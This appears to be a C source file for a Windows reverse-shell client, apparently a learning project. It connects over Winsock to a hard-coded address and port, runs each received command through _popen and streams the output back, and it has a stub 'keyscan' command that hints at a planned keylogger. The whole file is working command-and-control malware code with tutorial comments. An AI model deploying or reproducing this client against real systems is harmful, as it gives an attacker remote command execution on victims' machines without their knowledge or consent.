#include <stdio.h>

// winsock2.h is the header file to be included for winsock functions
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <stdlib.h>

#define DEFAULT_BUFLEN 128

// ws2_32.lib is the library file to be linked with the program to be able to use winsock functions.
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[]) {

	// This structure is used to store Windows Sockets initialization data returned by a call to WSAStartup. 
	// It contains data about the Winsock.dll implementation.
	WSADATA wsa;

	SOCKET s;
	int i = 1;

	struct sockaddr_in server;
	// set reply to 128 bytes since we shouldn't ever receive a command longer than that
	char server_reply[DEFAULT_BUFLEN];
	int recv_size = DEFAULT_BUFLEN;

	int iResult;

	printf("\nInitialising Winsock...");

	// init WinSock2
	iResult = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (iResult != NO_ERROR) {
		wprintf(L"WSAStartup function failed with error: %d\n", iResult);
		return 1;
	}

	printf("\nInitialised.");

	// socket(address_family, socket_type, protocol)
	// If a value of 0 is specified, the caller does not wish to specify a protocol 
	// and the service provider will choose the protocol to use.
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		printf("Could not create socket: &d", WSAGetLastError());
		WSACleanup();
	}

	printf("\nSocket created.\n");

	// the server ip we want to connect to 
	// The ip string can be converted to the in_addr structure with the InetPton function
	// since inet_addr is deprecated and potentially leads to thread safety issues
	InetPton(AF_INET, TEXT("127.0.0.1"), &server.sin_addr.s_addr);
	server.sin_family = AF_INET;

	// htons is done to maintain the arrangement of bytes which is sent in the network(Endianness)
	server.sin_port = htons(11111);

	//Connect to remote server
	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
	{
		puts("connect error");
		return 1;
	}

	puts("Connected");

	do {
		if ((recv_size = recv(s, server_reply, DEFAULT_BUFLEN - 1, 0)) == SOCKET_ERROR)
		{
			puts("recv failed");
		}

		puts("Reply received\n");

		//Add a NULL terminating character to make it a proper string before printing
		server_reply[recv_size] = '\0';

		if (strcmp(server_reply, "keyscan") == 0) {
			send(s, "running keyscan", strlen("running keyscan"), 0);
			continue;
		}

		char   psBuffer[128];
		FILE* pPipe;

		/* Run DIR so that it writes its output to a pipe. Open this
		 * pipe with read text attribute so that we can read it
		 * like a text file.
		 */

		if ((pPipe = _popen(server_reply, "rt")) == NULL)
			exit(1);

		/* Read pipe until end of file, or an error occurs. */

		while (fgets(psBuffer, 128, pPipe))
		{
			send(s, psBuffer, strlen(psBuffer), 0);
		}

		/* Close pipe and print return value of pPipe. */
		if (feof(pPipe))
		{
			printf("\nProcess returned %d\n", _pclose(pPipe));
		}
		else
		{
			printf("Error: Failed to read the pipe to the end.\n");
		}

	} while (i == 1);

	return 0;
}

int sendData(SOCKET s, char* msg) {
	if (send(s, msg, strlen(msg), 0) < 0) {
		puts("Send failed");
		return 0;
	}
	return 1;
}